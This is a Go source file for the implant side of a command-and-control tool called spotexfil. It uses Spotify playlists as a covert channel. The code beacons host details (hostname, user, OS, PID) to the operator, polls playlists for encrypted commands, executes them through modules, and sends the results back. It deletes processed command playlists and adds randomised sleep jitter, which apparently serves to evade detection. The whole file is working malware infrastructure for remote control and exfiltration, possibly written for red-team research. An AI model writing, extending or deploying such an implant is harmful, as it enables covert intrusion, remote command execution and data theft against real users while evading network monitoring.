package c2

import (
	"context"
	"encoding/json"
	"fmt"
	"hash/adler32"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/protocol"
	"github.com/sourcefrenchy/spotexfil/internal/spotify"
)

// Implant polls for commands and executes them.
type Implant struct {
	client        *spotify.Client
	key           string
	interval      int
	jitter        int
	processedSeqs map[int]bool
}

// NewImplant creates a new implant.
func NewImplant(client *spotify.Client, key string, interval, jitter int) *Implant {
	return &Implant{
		client:        client,
		key:           key,
		interval:      interval,
		jitter:        jitter,
		processedSeqs: make(map[int]bool),
	}
}

// getClientID returns Adler32 hash of primary IP as hex string.
func getClientID() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	ip := "127.0.0.1"
	if err == nil {
		ip = conn.LocalAddr().(*net.UDPAddr).IP.String()
		conn.Close()
	}
	return fmt.Sprintf("%08x", adler32.Checksum([]byte(ip)))
}

// sendCheckin sends a check-in beacon so the operator knows we connected.
func (imp *Implant) sendCheckin() {
	ctx := context.Background()
	clientID := getClientID()

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = "unknown"
	}

	checkinData := map[string]interface{}{
		"client_id": clientID,
		"ip_hash":   clientID,
		"hostname":  hostname,
		"os":        runtime.GOOS + "/" + runtime.GOARCH,
		"user":      username,
		"pid":       os.Getpid(),
	}

	dataBytes, _ := json.Marshal(checkinData)
	result := protocol.NewC2Message("checkin", 0)
	result.Status = "ok"
	result.Data = string(dataBytes)

	encoded, err := protocol.EncodeMessage(result.ToResultMap(), imp.key)
	if err != nil {
		fmt.Printf("[!] Checkin encode failed: %v\n", err)
		return
	}

	chunks, err := protocol.ChunkPayload(encoded, 0,
		protocol.ChannelRes, imp.key)
	if err != nil {
		fmt.Printf("[!] Checkin chunk failed: %v\n", err)
		return
	}

	for attempt := 1; attempt <= 3; attempt++ {
		err = imp.client.WriteC2Playlists(ctx, chunks)
		if err == nil {
			fmt.Printf("[*] Check-in sent (client_id=%s)\n", clientID)
			return
		}
		if isRateLimit(err) {
			wait := time.Duration(attempt*10) * time.Second
			fmt.Printf("[*] Rate limited, retrying in %s...\n", wait)
			time.Sleep(wait)
			continue
		}
		fmt.Printf("[!] Checkin send failed: %v\n", err)
		return
	}
}

// isRateLimit checks if an error is a Spotify rate limit.
func isRateLimit(err error) bool {
	if err == nil {
		return false
	}
	s := strings.ToLower(err.Error())
	return strings.Contains(s, "rate") || strings.Contains(s, "429") || strings.Contains(s, "too many")
}

// Run starts the main polling loop.
func (imp *Implant) Run() {
	fmt.Println("[*] Implant started, polling for commands...")
	imp.sendCheckin()

	for {
		imp.pollAndExecute()
		sleepTime := imp.interval + rand.Intn(2*imp.jitter+1) - imp.jitter
		if sleepTime < 10 {
			sleepTime = 10
		}
		time.Sleep(time.Duration(sleepTime) * time.Second)
	}
}

func (imp *Implant) pollAndExecute() {
	ctx := context.Background()

	seqGroups, err := imp.client.ReadC2Playlists(ctx,
		protocol.ChannelCmd, imp.key, -1)
	if err != nil {
		if !isRateLimit(err) {
			fmt.Printf("[!] Poll error: %v\n", err)
		}
		return
	}

	if len(seqGroups) == 0 {
		return
	}

	for seqNum, chunkMetas := range seqGroups {
		if imp.processedSeqs[seqNum] {
			_ = imp.client.CleanC2Playlists(ctx,
				protocol.ChannelCmd, imp.key, seqNum)
			continue
		}

		payload := protocol.ReassemblePayload(chunkMetas)
		cmdDict, err := protocol.DecodeMessage(payload, imp.key)
		if err != nil {
			errStr := strings.ToLower(err.Error())
			if strings.Contains(errStr, "tag") || strings.Contains(errStr, "decrypt") || strings.Contains(errStr, "cipher") {
				fmt.Printf("[!] Decryption failed for seq=%d: encryption key mismatch with operator?\n", seqNum)
			} else {
				fmt.Printf("[!] Failed to decode seq=%d: %v\n", seqNum, err)
			}
			_ = imp.client.CleanC2Playlists(ctx,
				protocol.ChannelCmd, imp.key, seqNum)
			continue
		}

		msg := protocol.FromCommandMap(cmdDict)
		fmt.Printf("[*] Executing seq=%d module=%s\n", seqNum, msg.Module)

		result := imp.execute(msg)
		imp.sendResult(ctx, result)
		_ = imp.client.CleanC2Playlists(ctx,
			protocol.ChannelCmd, imp.key, seqNum)
		imp.processedSeqs[seqNum] = true
	}
}

func (imp *Implant) execute(msg *protocol.C2Message) *protocol.C2Message {
	mod := GetModule(msg.Module)
	if mod == nil {
		return &protocol.C2Message{
			Module: msg.Module,
			Seq:    msg.Seq,
			Status: "error",
			Data:   fmt.Sprintf("Unknown module: %s", msg.Module),
		}
	}

	status, data := mod.Execute(msg.Args)
	return &protocol.C2Message{
		Module: msg.Module,
		Seq:    msg.Seq,
		Status: status,
		Data:   data,
	}
}

func (imp *Implant) sendResult(ctx context.Context, result *protocol.C2Message) {
	encoded, err := protocol.EncodeMessage(result.ToResultMap(), imp.key)
	if err != nil {
		fmt.Printf("[!] Failed to encode result seq=%d: %v\n", result.Seq, err)
		return
	}

	chunks, err := protocol.ChunkPayload(encoded, result.Seq,
		protocol.ChannelRes, imp.key)
	if err != nil {
		fmt.Printf("[!] Failed to chunk result seq=%d: %v\n", result.Seq, err)
		return
	}

	if err := imp.client.WriteC2Playlists(ctx, chunks); err != nil {
		fmt.Printf("[!] Failed to send result seq=%d: %v\n", result.Seq, err)
		return
	}

	fmt.Printf("[*] Result sent for seq=%d\n", result.Seq)
}
